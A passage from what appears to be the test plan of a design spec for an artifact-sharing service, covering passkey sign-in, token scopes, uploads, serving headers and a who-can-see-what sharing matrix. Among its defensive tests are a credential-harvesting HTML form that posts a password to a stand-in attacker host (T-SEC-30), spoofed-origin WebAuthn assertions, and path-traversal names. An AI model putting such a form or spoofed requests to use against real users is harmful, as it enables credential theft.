**T-SEC-22 — challenge replay.** *Integration.* Complete a login, capture the assertion, and
replay the identical body. Also: use a challenge from `register/begin` at `login/finish`; use a
challenge after its 300 s Redis TTL; use one challenge for two concurrent finishes. **Expect:**
the first succeeds; every replay is `401 webauthn_verification_failed`; the Redis key
`sh:wa:{id}` is deleted at first use (asserted directly), so replay fails on lookup rather than
on comparison; the concurrent pair yields exactly one success.

**T-SEC-23 — wrong origin and wrong RP ID.** *Integration.* The authenticator signs with
`origin: https://evil.test`, with `origin: http://share.test` (scheme downgrade), with
`origin: https://share.test.evil.test` (suffix confusion), and with an RP ID hash for
`test` (a registrable-suffix attack) and for `other.test`. **Expect:** `401
webauthn_verification_failed` for all five; an `auth.signin_failed` audit row for each; no
session created; the failures count against `webauthn_finish`.

**T-SEC-24 — signature-counter regression.** *Integration.* Register a credential reporting
counter 5. Sign in at 6 (succeeds, stored count becomes 6). Then assert at 6, at 5, and at 0.
Separately, a credential whose stored count is 0 asserts at 0 repeatedly. **Expect:** the three
non-increasing assertions are `401 credential_counter_regressed`; the credential is **not**
revoked (§4.3 step 3); an `auth.counter_regressed` audit row and a `counter_regressed` email
fire for each; the zero-count credential succeeds every time with no email. Verifies §4.3, §10.4.

### 14.5.8 Everything else that is security-shaped

**T-SEC-25 — secrets never reach logs or errors.** *Integration.* Drive one request of each kind
with a real token, a real session cookie, a real share token, a real recovery code, and a real
share-link password, capturing all log output at `DEBUG`. **Expect:** no `shr_` prefix beyond
`display_prefix` (12 chars), no `Bearer ` value, no cookie value, no password, no recovery code
anywhere in the logs. No error `message` or `detail` in any 4xx/5xx contains a filesystem path,
a SHA-256, a token, or the string `/var/lib/share`. Verifies §4.10, §5.1.1.

**T-SEC-26 — the audit log cannot be rewritten.** *Integration.* Connect as the application
database role and attempt `UPDATE audit_event`, `DELETE FROM audit_event`, `TRUNCATE`, and
`ALTER TABLE`. **Expect:** `InsufficientPrivilege` on all four; `INSERT` and `SELECT` succeed.
Verifies §3.8, §10.7.

**T-SEC-27 — a revoked artifact cannot be revalidated into a `304`.** *e2e.* Fetch a file
through a link, capturing `ETag`. Revoke the link. Re-request with `If-None-Match`. **Expect:**
`410`/`404`, never `304` — the authorize call runs before Caddy's conditional handling (§6.6.5).
Repeat with `If-Modified-Since` and with a `Range` request carrying `If-Range`.

**T-SEC-28 — no listing of a space, ever.** *e2e.* `GET /`, `/~`, `/~robert`, `/~robert/`,
`/~sarah/`, `/q3/` (a name prefix with children), and `/api/v1/artifacts` unauthenticated.
**Expect:** `404` for the artifact-space forms (the root `/` may serve the sign-in redirect —
asserted to contain no artifact names), `401` for the API. `/q3/` renders `q3`'s own listing
only if `q3` is an artifact the caller may see, and never a list of names starting with `q3`.
Verifies §6.6.2.

**T-SEC-29 — `robots.txt` has no override.** *e2e + static.* `GET /robots.txt` unauthenticated,
authenticated, and through a share link. **Expect:** byte-exactly
`User-agent: *\nDisallow: /\n` in all three. Grep the settings schema and the artifact schema
for `indexable|robots|noindex` and assert no per-artifact control exists. Every artifact
response carries `X-Robots-Tag: noindex, nofollow`. Verifies §6.7.

**T-SEC-30 — the phishing heuristic warns and never blocks.** *Integration.* Post an HTML file
containing `<form action="https://evil.test/collect"><input type="password">`. **Expect:**
`201`/`200` — the post **succeeds** — with a `possible_credential_form` warning in `warnings`,
and the warning is visible to the owner only (absent from any recipient-facing response).
Posting the same form with a same-origin action produces no warning. Verifies §10.5.

## 14.6 T-AUTH — identity, passkeys, sessions, tokens

**T-AUTH-01 — passkey registration round trip.** *Integration.* Software authenticator, real
ceremony. `register/begin` as a signed-in user → assert `rp.id == SHARE_HOST`,
`attestation == "none"`, `residentKey == "preferred"`, `userVerification == "preferred"`,
`timeout == 120000`, and `excludeCredentials` listing the user's existing credential IDs.
Finish → `201`, a `passkey_credential` row with the COSE key, `sign_count`, `transports`,
`aaguid`, `backup_eligible`, `backup_state`, and a `name` defaulted from the AAGUID list. A
`passkey.register` audit row. Verifies §4.2.

**T-AUTH-02 — duplicate authenticator is excluded.** *Integration.* Register, then attempt to
register the same credential ID again. **Expect:** the browser-side exclusion is asserted by
checking the ID appears in `excludeCredentials`; a client that ignores it and finishes anyway is
rejected with `409` and no second row (the `credential_id` unique constraint is real). §4.2.

**T-AUTH-03 — usernameless sign-in.** *Integration.* `login/begin` with an empty body →
`allowCredentials == []`. The authenticator picks the discoverable credential; `login/finish`
→ `200` with `{user:{id,email,handle,displayName,isRoot}}`, `Set-Cookie: share_s=…;
HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=2592000` and no `Domain` attribute (host-only).
A `session` row with `passkey_id` set. `auth.signin` audited. §4.3.

**T-AUTH-04 — unknown credential.** *Integration.* Finish with a credential ID never registered
→ `401 invalid_credential`, no session, audited, counted against `webauthn_finish`. §4.3.

**T-AUTH-05 — session lifetime and sliding extension.** *Integration.* With the injected clock:
a request 59 minutes after issue does **not** move `expires_at`; a request at 61 minutes does,
to now + 30 d; at day 89 the session still works; at day 91 it is `401 session_expired`
regardless of sliding — the 90-day absolute cap holds. §4.4.

**T-AUTH-06 — session listing and revocation.** *Integration.* Create three sessions.
`GET /api/v1/auth/sessions` returns created, last seen, IP, coarse UA, passkey name, and exactly
one `current: true`. `DELETE` a non-current one → that cookie is `401` on its next request and
its `sh:sess:` Redis key is deleted immediately. Revoking the passkey that signed sessions 1 and
3 revokes both and leaves 2. Disabling the user revokes all. §4.4.

**T-AUTH-07 — token resolution is uniform and constant-time.** *Integration.* Present, in turn:
a valid token, an unknown well-formed token, `tok_revoked`, `tok_expired`,
`tok_disabled_owner`, a token with a mangled prefix, an empty Bearer, and a token with a valid
hash but wrong prefix. **Expect:** `401 invalid_token` with an identical body for all failure
cases — "revoked" is never distinguishable from "wrong". Median latency delta across the failure
classes < 1 ms over 500 samples. `last_used_at` is not written on the request path (assert no
`UPDATE api_token` in the statement log); it appears after the 60 s Redis flush. §4.6.

**T-AUTH-08 — token revocation bypasses the cache.** *Integration.* Authenticate to warm
`sh:tok:{sha}`. Revoke. Immediately call again with the clock frozen. **Expect:** `401
invalid_token`; the Redis key is absent (explicit `DEL`, not TTL). §4.6.

**T-AUTH-09 — scope enforcement across the whole powerset.** *Integration.* Parameterised over
every (endpoint, token) pair from the §14.2.8 powerset. **Expect:** the call succeeds iff the
token holds the scope §4.6.1 assigns to that endpoint; otherwise `403 insufficient_scope` with
`detail.scope` naming the **missing** scope literally (`share:create`, not "sharing"). A
matrix-completeness assertion fails if any endpoint maps to no scope. §4.6.1.

**T-AUTH-10 — the agent default cannot share.** *Integration.* With `tok_agent`: `POST
/artifacts/{n}/links`, `PATCH /links/{id}`, `DELETE /links/{id}`, `POST /artifacts/{n}/grants`,
and `POST /artifacts/bundle?link=true` if such a parameter exists. **Expect:** `403
insufficient_scope`, `detail.scope == "share:create"`, message naming it; zero `share_link` rows
created; a `link.create` audit row is **not** written. §7.9.

**T-AUTH-11 — the agent default cannot permanently delete.** *Integration.* With `tok_agent`:
`DELETE /api/v1/artifacts/{n}?purge=true` → `403 insufficient_scope`, `detail.scope ==
"artifacts:delete"`. Then trash 50 artifacts (allowed) and assert every one is restorable and
every byte still on disk. **The worst case for a runaway agent is a full trash.** §8.4, §4.6.1.

**T-AUTH-12 — device-code flow.** *Integration.* `device/start` → `deviceCode`, a `userCode`
matching `^[A-Z0-9]{4}-[A-Z0-9]{4}$` with no ambiguous characters, `verifyUrl`, `expiresIn:600`,
`interval:5`. Poll before approval → `428 authorization_pending`. Poll faster than `interval` →
`429 rate_limited`, `detail.bucket == "device_poll"`. Approve in an authenticated session; poll
→ `200` with a token holding exactly `["artifacts:read","artifacts:write"]`. Poll again → the
code is single-use, `428`/`404`, never a second token. Let a code expire → `410`. A
`token.device_authorize` audit row and a `token_created` email. §4.6.2.

**T-AUTH-13 — recovery code.** *Integration.* Use a valid code → `200`, a session whose
`expires_at` is now + 30 min. Assert that session can call exactly two things — register a
passkey and list passkeys — and is `403` on `/api/v1/artifacts` and everything else. Using the
code invalidates all other codes and issues one fresh code. Reusing it → `401`. A
`auth.recovery_used` audit row and a `recovery_used` email that **cannot** be disabled (set
`settings.notifications.recovery_used=false` and assert the mail still fires). §4.5, §10.8.

**T-AUTH-14 — recovery rate limits.** *Integration.* 6 attempts for one email in an hour → the
6th is `429`, `detail.bucket == "recovery_use"`. 21 attempts from one IP across different emails
in a day → `429`, bucket `recovery_use_ip`. §10.2.2.

**T-AUTH-15 — `sharectl grant-session`.** *Integration.* Run it for an email; it prints a URL;
first use establishes a 30-minute session; second use fails. Audited as `auth.session_granted`
with `actor_type='system'`. Running it as a non-root OS user fails before touching the database.
§4.5.

**T-AUTH-16 — no password exists anywhere.** *Static + integration.* Grep the schema for a
column matching `password` and assert exactly two exist: `share_link.password_hash` and
`recovery_code.code_hash` (named differently, asserted by name). Grep the API surface for any
route matching `password.*reset|forgot|change` and assert none exists outside
`PATCH /api/v1/links/{id}`. §4.1.

**T-AUTH-17 — invites.** *Integration.* Root invites `sarah@…` with handle `sarah` → an `invite`
row, an `invite` email, `user.invite` audited. A second pending invite for the same email →
`409`. An invite for a reserved handle (`admin`, `www`, `root`, `system`, `support`, `help`,
`about`, `status`, `null`, `undefined`, `s`, `api`, `mcp`, `auth`, `internal`) →
`422 name_reserved`. Accepting registers a passkey and creates the user with an empty space;
`user.create` audited. Accepting an expired invite → `410 invite_expired`. A non-admin user
inviting → `403 insufficient_scope` naming `account:admin`. §4.8, §6.3.

**T-AUTH-18 — bootstrap.** *Integration.* On an empty database, `sharectl bootstrap` creates
exactly one user with `is_root=true`, prints a 15-minute registration URL, and prints one
recovery code and one API token. Running it again with any user present → non-zero exit,
nothing changed. Attempting to insert a second `is_root=true` row raises on `one_root_user`.
§3.11, §3.3.

**T-AUTH-19 — negative trio for `/auth/*`.** *Integration.* Per §14.1.3 for every auth route:
permission (a recipient session at `/auth/passkey/register/begin` → `403
wrong_credential_class`), limit (21 `login/begin` from one IP in 10 min → `429`, bucket
`webauthn_begin`; 11 `login/finish` → bucket `webauthn_finish`), malformed (non-CBOR credential,
missing `credential`, oversized attestation → `422` with `detail.fields`). §10.2.2.

## 14.7 T-POST — declare, upload, commit

**T-POST-01 — the happy three-phase path.** *Integration.* Declare 3 files → `201` with
`artifactId`, `versionId`, `seq:1`, `uploadSessionId`, `expiresAt` ≈ now + 4 h, `totalFiles:3`,
`skipped:0`, three `uploads` entries. `PUT` each → `{sha256,size,remaining}` with `remaining`
counting down 2,1,0. Commit → `200` matching §5.4's body: `url`, `seq:1`, `kind:"bundle"`,
`entryPath:"/index.html"`, `fileCount:3`, `totalBytes`, `visibility:"private"`, `shareLinks:0`.
Assert `visibility` is `private` and zero `share_link` rows — **posting never publishes**. An
`artifact.post` audit row with `actor_token_id`. §5.4.

**T-POST-02 — dedupe within one manifest.** *Integration.* Declare 5 files where three paths
carry the same hash. **Expect:** `uploads` has 3 entries, not 5; one `PUT` satisfies all three
paths; commit writes 5 `version_file` rows referencing 3 files; `file.ref_count` for the shared
hash increases by **3** (per reference, not per file). §5.4.

**T-POST-03 — dedupe across versions and users.** *Integration.* Post v1; repost with one file
changed. **Expect:** second declare has `skipped:2`, `uploads` length 1. `ref_count` for the
unchanged files is 2. Then `user_b` posts the same unchanged file → `skipped:0` for them
(§5.4.1), upload returns `200` without a second blob, `ref_count` becomes 3, one file on disk.
§3.5, §5.4.1.

**T-POST-04 — resume after a crash.** *Integration.* Declare 5 files, upload 2, kill the client.
`GET /api/v1/uploads/{sid}` → the session with **freshly signed** URLs for the 3 pending only,
new `exp` values, and the 2 done files absent. Upload the rest and commit → success, `seq:1`.
Assert the resumed URLs are valid and the original URLs for the 2 completed files now return
`200` immediately without reading a body. §5.4 phase 2.

**T-POST-05 — commit before uploads finish.** *Integration.* Commit with 1 of 3 uploaded →
`409 files_missing` with `detail` listing the missing paths; **nothing mutated** —
`artifact.live_version_id` unchanged, no `version_file` rows, `ref_count` unchanged, session
still `open`. Complete and commit → success. §5.4 phase 3.

**T-POST-06 — concurrent commit of one session.** *Integration `@commit_required`.* Fire two
commits for the same `versionId` simultaneously from two connections. **Expect:** exactly one
`200`; the other `409 upload_session_closed`. Exactly one `artifact_version` at that `seq`, one
set of `version_file` rows, `ref_count` incremented exactly once, one `artifact.post` audit row.
Run 20 times to catch the race. §5.4.

**T-POST-07 — concurrent commit of two sessions on one name.** *Integration
`@commit_required`.* Declare twice against `postcal` (seq 2 and seq 3 drafts), then commit both
concurrently. **Expect:** both may succeed — `UNIQUE (artifact_id, seq)` forces distinct
sequences, and the test asserts the final `live_version_id` is one of the two, that no seq is
duplicated or skipped, and that `version_file` rows exist for both. If the implementation
serialises instead, the second must be `409` with a stable code, and the test accepts either
behaviour but requires it be **deterministic across 20 runs**. See §14.24 ambiguity A6.

**T-POST-08 — quota at declare.** *Integration.* Set the user near quota; declare a version that
would exceed it. **Expect:** `413 quota_exceeded` at **declare** — before any byte moves —
with `detail.currentBytes`, `projectedBytes`, `quotaBytes`; no `upload_session` row; no signed
URLs issued. §10.3.

**T-POST-09 — quota at commit.** *Integration.* Declare within quota. Then, before commit, fill
the quota with a second artifact. Commit → `413 quota_exceeded`, nothing mutated, the session
left in a state where a later commit after freeing space succeeds. Asserts quota is checked at
**both** points (§10.3), which the declare-only test cannot show.

**T-POST-10 — over-quota still allows reading, sharing, and deleting.** *Integration.* At 100%:
`POST /artifacts` → `413`; `GET /artifacts`, `GET files/content`, `POST links` (with
`tok_sharer`), `DELETE /artifacts/{n}` all succeed. §10.3.

**T-POST-11 — 5,000-file manifest.** *Integration.* Declare exactly 5,000 files (small),
upload with concurrency 8, commit. **Expect:** success; `file_count == 5000`; the declare
response is a single JSON body under the 10 MB request ceiling (assert the *request* is under
it — 5,000 entries at ~120 bytes is ~600 KB); commit completes in one transaction using `COPY`
(asserted by statement count, not a per-row `INSERT` loop: fewer than 50 statements total).
Declare 5,001 → `413 too_many_files`. §5.4, §10.3, §14.20.

**T-POST-12 — file and artifact ceilings.** *Integration.* A file one byte over
`SHARE_MAX_FILE_BYTES` → `413 file_too_large` **at declare** (the declared size is checked) and
again at upload if a client lies about the size (the stream is cut and the partial discarded). A
version whose summed size exceeds `SHARE_MAX_ARTIFACT_BYTES` → `413 artifact_too_large` at
commit. §10.3, §3.5.

**T-POST-13 — `kind` derivation.** *Integration.* Parameterised: 4 files → `bundle`; 1 `.html` →
`page`; 1 `.pdf` → `document`; 1 `.docx` → `document`; 1 `.png` → `image`; 1 `.mp4` → `video`;
1 `.bin` → `file`; 1 `.svg` → `image`; 1 `.txt` → `file`; 2 files where one is HTML → `bundle`.
**Expect:** the mapping above exactly, derived at commit from the manifest shape with **no file
opened** (read counter is zero during commit). §3.4.

**T-POST-14 — entry-path resolution precedence.** *Unit + integration.* The five rules of §5.5 in
order: (1) explicit `entryPath` present in the manifest wins even when `/index.html` also
exists; (2) explicit `entryPath` **absent** from the manifest → falls through to the next rule
and returns an `entry_path_not_found` warning (see §14.24 ambiguity A3); (3) `/index.html`
wins over a lone other HTML file; (4) exactly one HTML file among several non-HTML files wins;
(5) two HTML files and no `/index.html` → no entry, `no_entry_point` warning, root renders the
listing; (6) exactly one file of any type → that file; (7) zero files → rejected at declare.
Each case asserts both the commit response's `entryPath` and what `GET /{name}` actually serves.
§5.5, §6.6.1.

**T-POST-15 — name validation.** *Unit + integration.* Accept: `a`, `postcal`, `q3/market-report`,
`a.b-c_d`, `x/y/z/1/2/3/4/8` (8 segments), a 200-char name. Reject: `PostCal` → accepted **as
`postcal`** (lowercased before validation, §5.3); `-lead`, `.lead`, `_lead`, `a//b`, `a/`, `/a`,
`a/../b`, `a/..`, `a/.`, 9 segments, 201 chars, `a b`, `a?b`, `a#b`, an emoji, a name that is
only dots. Reserved: `s`, `api`, `mcp`, `auth`, `internal`, `.well-known`, `robots.txt`,
`favicon.ico`, and any name starting with `~` → `422 name_reserved`. §5.3, §6.3.

**T-POST-16 — generated names.** *Integration.* Post 500 artifacts with no `name`. **Expect:**
every name matches `^[a-z]+-[a-z]+-[a-z0-9]{4}$`, passes §5.3 validation, is not reserved, and
is unique within the space; a collision path exists (force the generator to repeat and assert
the server retries rather than returning `409`). §5.3.

**T-POST-17 — overwrite by name creates a version.** *Integration.* Post `postcal` twice.
**Expect:** one `artifact` row, two `artifact_version` rows (seq 1, 2), `live_version_id`
pointing at seq 2, the URL unchanged, `artifact.overwrite` audited (not a second
`artifact.post`), and version 1 still fully served through the version preview route. §8.2,
§10.7.

**T-POST-18 — the pointer flip is the only visible change.** *Integration `@commit_required`.*
Start a reader loop hitting `/postcal/index.html` from another connection while a second version
commits. **Expect:** every response is `200` with either v1's or v2's bytes complete and valid —
never a mix, never a `404`, never a partial. The transition happens exactly once in the sequence
(no flapping). §5.4.

**T-POST-19 — one-shot bundle upload.** *Integration.* `POST /api/v1/artifacts/bundle` with a
tar and with a gzip. **Expect:** the same body shape as commit; `kind`, `entryPath`, and
`fileCount` correct; a `.tar.gz` and a plain `.tar` both accepted; query parameters `name`,
`title`, `entryPath` honoured; an archive with a name colliding with an existing artifact
creates a new **version** of it. Ceilings: 201 MB compressed → `413`; 801 MB expanded → `413
artifact_too_large`; 5,001 entries → `413 too_many_files`. §5.6.

**T-POST-20 — idempotency.** *Integration.* Declare with `Idempotency-Key: K` twice with the
identical body → the second returns the original `201` body byte-identically plus
`X-Share-Idempotent-Replay: true`, and **no second `upload_session` row**. Same key, different
body → `409 idempotency_key_reused`. Same key, different user → independent (the key is scoped
to `(user, endpoint, key)`). Same key, different endpoint → independent. After 24 h the key is
forgotten and the call creates a new session. A 256-char key → `422`. §5.1.3.

**T-POST-21 — abandoned sessions.** *Integration.* Declare, upload one file, advance 4 h + 1 min,
run the cleanup job. **Expect:** `upload_session.state == 'expired'`, the draft
`artifact_version` row deleted, **no `version_file` rows ever existed so no `ref_count` moved**,
the uploaded file now unreferenced and collectable after its 24 h grace. Committing the expired
session → `409 upload_session_expired`. Re-declaring the same manifest → `skipped` equals the
number already uploaded and `uploads` is correspondingly short. §5.7.

**T-POST-22 — copy.** *Integration.* `user_b` grants `deck` to `user_c`; `user_c` copies it.
**Expect:** a new artifact in `user_c`'s space, first version referencing the **same** `file`
rows (zero new blobs, `ref_count` incremented), `copied_from` set, `visibility: private`, zero
links and grants regardless of the source's state, `artifact.copy` audited on **both** sides,
and the event visible in `user_b`'s artifact activity. Copying something not shared with you →
`404`. §5.10, §7.7.1.

**T-POST-23 — `PATCH` metadata.** *Integration.* Any subset of `name`, `title`, `description`,
`entryPath`, `tags`, `ttl`, `pinned`. Absent fields unchanged; `null` clears nullable ones.
Renaming moves the address: the new name `200`s and the old `404`s **immediately** with no
alias, no redirect. Changing `entryPath` to a path in the manifest takes effect without a repost;
to a path not in the manifest → `422`. `PATCH` containing `visibility` or `shareLinks` →
`422 use_share_endpoint` even when the value matches the current state. 21 tags → `422`. §5.9.

**T-POST-24 — negative trio for the post surface.** *Integration.* Permission: `tok_ro` declaring
→ `403 insufficient_scope` naming `artifacts:write`. Limit: 241 declares in an hour → `429`,
`detail.bucket == "post"`; 121 from one token → bucket `post_token`; 17 concurrent `PUT`s on one
session → `429 too_many_uploads` with `Retry-After`. Malformed: `files: []` → `422`; a
`sha256` of 63 chars, uppercase hex, or non-hex → `422 invalid_hash`; `size` as a string;
`ttl: "banana"` → `422 invalid_ttl`; an unknown top-level field. §14.1.3.

## 14.8 T-SERVE — resolution and serving

**T-SERVE-01 — owner serves their own bundle.** *e2e.* `GET /postcal/style.css` with a session.
**Expect:** `200`, `Content-Type: text/css; charset=utf-8`, `Cache-Control: private, max-age=300`,
`ETag` equal to the file's SHA-256, `Last-Modified` equal to the version's `created_at`,
`X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`,
`X-Robots-Tag: noindex, nofollow`, `Permissions-Policy: interest-cohort=()`, no `Server` header,
no header naming the artifact, version, or owner. §2.4, §6.6.5, §6.6.6.

**T-SERVE-02 — both root forms resolve.** *e2e.* For the root user, `/postcal` and
`/~robert/postcal` both serve the same bytes; for `user_b`, `/deck` is `404` and
`/~sarah/deck` serves. §6.2.

**T-SERVE-03 — the file-resolution ladder.** *e2e.* Parameterised over the seven rules of §6.6.1:
empty path → entry; exact match; trailing slash → `+index.html`; `P + "/index.html"` exists →
`308` to `P + "/"` **preserving the query string**; `P + ".html"` exists → served; a missing path
in an artifact carrying `/404.html` → that file with status **404**; otherwise the standard
404 page. Assert the `308` (not `301`/`302`) and that the `Location` is relative-safe.

**T-SERVE-04 — no SPA fallback.** *e2e.* Request `/app/missing.json` in an artifact with
`/index.html`. **Expect:** `404` with the not-found page, **not** `index.html`, and the
`Content-Type` of the 404 page is `text/html` — but the test asserts the body is the error page,
so a client asking for JSON is not silently handed an app shell. §6.6.1.

**T-SERVE-05 — the listing page.** *e2e.* `GET /` on `bundle_noentry`. **Expect:** `200`, an
HTML listing with one row per file showing name, size, and type, links that work, inline CSS
only (**zero external subresource requests**, asserted in a headless browser), and
`Cache-Control: no-store`. The listing shows only this artifact's files and never a sibling
artifact's name. §6.6.2.

**T-SERVE-06 — content-type table.** *Unit + e2e.* Every row of §6.6.3, plus an extension not in
the table → `application/octet-stream` with `Content-Disposition: attachment`. Explicit
`contentType` wins except where §6.6.3's coercion applies (covered by T-SEC-06).

**T-SERVE-07 — cache-control matrix.** *e2e.* Owner → `private, max-age=300`; grantee →
`private, max-age=300`; through a link → `private, no-store`; a filename containing a content
hash (`app.4f2a9c1e.js`) → `private, max-age=31536000, immutable`; listing and error pages →
`no-store`. **Every** response contains `private` and none contains `public` or `s-maxage` —
asserted by sweeping 200 responses of all kinds. §6.6.5.

**T-SERVE-08 — precompression.** *e2e.* A 50 KB CSS file gets `.br` and `.gz` siblings after the
worker runs; a request with `Accept-Encoding: br` returns `Content-Encoding: br` and the brotli
bytes; with no `Accept-Encoding`, the raw bytes. A 500-byte file and an 11 MB file get **no**
siblings (outside the 1 KB–10 MB window). A PNG, an MP4, and a PDF never get siblings. §3.5.

**T-SERVE-09 — range requests.** *e2e.* Against the 12 MB MP4: a single range → `206` with
`Content-Range` and exactly the requested bytes; an open-ended range; a suffix range
(`bytes=-1000`); a multipart range → `206` `multipart/byteranges`; an unsatisfiable range →
`416`; `If-Range` with a matching and a non-matching `ETag`. Assert `/internal/authorize` ran
**once per request** (recorder count) and that the byte serving did not pass through the API.
§6.6.4.

**T-SERVE-10 — video is never opened.** *Integration.* Post the MP4 and read every artifact and
version response. **Expect:** no `duration`, `width`, `height`, `codec`, or thumbnail anywhere;
no `.jpg` sibling on disk; the read counter for the blob is zero outside serving. §6.6.4, P5.

**T-SERVE-11 — the authorize contract.** *Integration.* Call `/internal/authorize` directly over
the socket for each outcome: authorised → `200` with `X-Share-File` in `ab/cd/<64 hex>` form
plus the optional headers; password needed → `401` with the gate body; unknown/no access/expired
/missing → `404`; rate limited → `429`; API unhealthy (dependency killed) → `503`. Assert an
**empty** optional header value causes Caddy to omit the header rather than emit an empty one
(e2e). §2.4.1.

**T-SERVE-12 — the resolution cache and its invalidation.** *Integration.* Resolve to warm
`sh:res:{space}:{name}`. Repost, rename, trash, restore, and change `entry_path`; after each,
the next request reflects the change **immediately** with the clock frozen, and the key is
absent from Redis. Then assert a 60 s TTL exists on the key when nothing has changed. §2.4.2.

**T-SERVE-13 — manifest cache immutability.** *Integration.* Warm `sh:man:{versionId}`. Assert
the key's TTL is ~600 s and that no code path ever writes a different value for the same version
ID — versions are immutable, so the test mutates `version_file` directly in SQL and asserts the
application never does so itself (statement-log assertion). §2.4.2.

**T-SERVE-14 — maintenance page.** *e2e.* Stop the API. **Expect:** artifact paths return `503`
served **by Caddy** from a static file with no application involvement; `/internal/ready`
returns `503` with a `checks` object when Postgres or Redis is down; the maintenance page
contains no artifact names. §2.4.1, §2.8.

**T-SERVE-15 — negative trio for the serving surface.** *e2e.* Permission: a stranger → `404`
(T-PRIV-01). Limit: 601 requests to one artifact from one IP in a minute → `429` with
`Retry-After`, bucket `serve_ip`, and the signed-in owner getting ten times that before
throttling; 3,001 requests through one link in an hour → bucket `serve_link`. Malformed: an 8 KB+
URL → `414`/`404`; a request with a NUL in the path; a `Range` header of `bytes=abc`. §10.2.3.

## 14.9 T-SHARE — links, grants, and the access matrix

**T-SHARE-01 — the full who-can-see-what matrix.** *e2e, `@security`. Verifies §6.5, §7.1,
§7.7, §8.4, §8.5, P7.*
- **Pre:** the eight sharing-state fixtures of §14.2.8, each a bundle with `/index.html` and
  `/style.css`. Five actors: **O** (owner, session), **G** (grantee `user_b`, session), **R+**
  (recipient holding the *correct* link for that artifact, unlocked if it has a password), **R−**
  (recipient holding a *different* artifact's live link, presenting that link's cookie and
  token), **S** (stranger: no credential, and separately a signed-in `user_c`).
- **Steps:** For every (actor, state) cell, request the artifact root, `/style.css`, a missing
  path, and — for R+/R− — the same through `/s/{token}/…`. 40 cells × 4 requests, table-driven.
- **Expect:** exactly this, with no cell left to implementation discretion.

| State ↓ / Actor → | O | G | R+ | R− | S |
| --- | --- | --- | --- | --- | --- |
| `private` | 200 | 404 | n/a | 404 | 404 |
| `granted` (to G) | 200 | 200 | n/a | 404 | 404 |
| `link` | 200 | 404 | 200 via `/s/…` | 404 | 404 |
| `link_pw`, not unlocked | 200 | 404 | 401 gate | 404 | 404 |
| `link_pw`, unlocked | 200 | 404 | 200 via `/s/…` | 404 | 404 |
| `link_expired` (sweep not run) | 200 | 404 | 410 on `/s/{t}`, 404 elsewhere | 404 | 404 |
| `link_revoked` | 200 | 404 | 410 on `/s/{t}`, 404 elsewhere | 404 | 404 |
| `trashed` | 404 at its URL, visible only in `?trashed=true` | 404 | 410 on `/s/{t}` | 404 | 404 |
| `ttl_expired` (sweep not run) | 404 at its URL | 404 | 410/404 | 404 | 404 |

  Additional assertions across the whole matrix: every `404` body is byte-identical to
  T-PRIV-01's; the only `410`s are on `/s/{token}` entry pages and their bodies name no
  artifact, owner, title, or type (§7.6); no response to G, R+, R−, or S carries
  `X-Share-Artifact`; and the owner's own `404` on a trashed artifact is identical to a
  stranger's, so the owner's URL does not leak trash state to a bystander sharing their screen.

**T-SHARE-02 — link creation.** *Integration.* With `tok_sharer`: `POST
/artifacts/postcal/links` with `{ttl:"14d", password:true, label:"Fairfield listing team"}` →
`201` with `id`, `url` matching `https://share.test/s/[1-9A-HJ-NP-Za-km-z]{22}`, `expiresAt`
exactly now + 14 d, `hasPassword:true`, `password` matching
`^[a-z]+-[a-z]+-[0-9]{2}$`, `label`, and `artifact:{name,title}`. The database stores only
`sha256(token)` and an argon2id `password_hash` — assert the raw token appears in **no** column
and the password hash starts with `$argon2id$v=19$m=65536,t=3,p=1$`. §7.3, §7.4.

**T-SHARE-03 — the password is returned exactly once.** *Integration.* After creation, `GET
/artifacts/{n}/links`, `GET /artifacts/{n}`, `PATCH /links/{id}`, `GET /api/v1/audit`, and the
MCP `share_get` all return `hasPassword: true` and **never** a `password` field. Setting a new
password returns nothing readable back either — only the caller-supplied value. §7.3.

**T-SHARE-04 — token entropy and format.** *`@real_entropy`, unit.* 10,000 tokens: 22 characters,
base58 alphabet only (no `0`, `O`, `I`, `l`), ≥ 128 bits when decoded, zero collisions,
uniform position distribution. §7.3.1.

**T-SHARE-05 — the password gate works without JavaScript.** *e2e.* Fetch `/s/{t}` with a client
that executes no script. **Expect:** `401`, an HTML form with `method="post"` and
`action` ending `/unlock`, `enctype` form-encoded, a `Set-Cookie: share_c=<challenge>`, and no
`<script>` tag in the body. Submitting form-encoded → `303` to `/s/{t}/`. Submitting the same
credentials as JSON also → `303`. The gate names no artifact, owner, title, size, or type
(§7.6) — asserted by checking the body against the artifact's title, name, and ID. §7.4.

**T-SHARE-06 — recipient cookie shape.** *e2e.* After unlock: `Set-Cookie:
share_r_<first 8 chars of token>=<id>.<hmac>; HttpOnly; Secure; SameSite=Lax;
Path=/s/<full token>; Max-Age=86400`. Assert `Max-Age` is clamped to the link's remaining
lifetime when that is under 24 h. Assert the cookie name derives from the token's first 8
characters exactly, so three links yield three cookie names. §4.7.

**T-SHARE-07 — assets load under the link path.** *e2e.* Load `/s/{t}/` in a headless browser
for a bundle whose HTML references `style.css`, `img/chart.png`, and an absolute `/style.css`.
**Expect:** the relative references resolve to `/s/{t}/style.css` and `/s/{t}/img/chart.png` and
return `200`; the absolute `/style.css` resolves to the site root and returns `404` (it is not
the recipient's artifact) — documented behaviour, and the reason the docs tell agents to use
relative links. At no point does any URL in the network log contain the artifact's name, the
owner's handle, or an `art_`/`ver_` ID. §7.6.

**T-SHARE-08 — revocation is immediate and cache-independent.** Covered by T-PRIV-09; this case
adds the API side: after `DELETE /links/{id}`, `GET /artifacts/{n}` shows `shareLinks: []` and
`visibility` reverting to `private` or `granted`, `GET /artifacts/{n}/links` omits it, and a
second `DELETE` → `404 link_not_found`. §7.4, §7.8.

**T-SHARE-09 — a link survives a rename.** *e2e.* Create a link on `postcal`, fetch through it,
then `PATCH` the name to `q4/calendar`. **Expect:** the link URL is unchanged and still `200`s;
the served content is the same; `/postcal` now `404`s and `/q4/calendar` `200`s for the owner;
the recipient's requests never reveal either name. Then rename again during a live recipient
session — the recipient's next request succeeds without re-unlocking. §7.2, §5.3.

**T-SHARE-10 — a link follows a content overwrite.** *e2e.* Recipient fetches v1 through a link.
Owner posts v2 with different bytes. **Expect:** the recipient's next request serves **v2**
without any new credential, and `Cache-Control: private, no-store` on the earlier response means
the browser did not retain v1 (asserted by a second browser fetch showing v2). The artifact
screen response lists the live link, which is the §7.2 mitigation, so `GET /artifacts/{n}`
after the overwrite still shows `shareLinks[0].id`. §7.2.

**T-SHARE-11 — trashing revokes links and grants; restore does not restore them.**
